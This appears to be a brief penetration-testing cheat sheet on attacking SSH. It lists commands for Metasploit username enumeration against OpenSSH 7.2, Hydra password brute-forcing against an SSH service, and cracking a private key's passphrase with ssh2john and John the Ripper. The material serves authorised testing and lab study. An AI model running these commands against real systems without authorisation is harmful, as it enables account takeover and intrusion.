---
title: "SSH"
---

<p style="text-align: right">_- last update 05/12/2022 -_</p>

## Users Enumeration

For openssh 7.2 (CVE...)

```bash
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS 10.10.36.111; set USER_FILE ./usernames.txt; run"
```

## Online dict attack

```bash
hydra -l $USERNAME -P $WORDLIST_PATH $TARGET ssh -V
```

## Offline private key attack

Put your private key to john format

```bash
python3 ssh2john.py id_rsa > johnhash.txt
```

Bruteforce unsing john

```bash
john --wordlist=rockyou.txt johnhash.txt
```
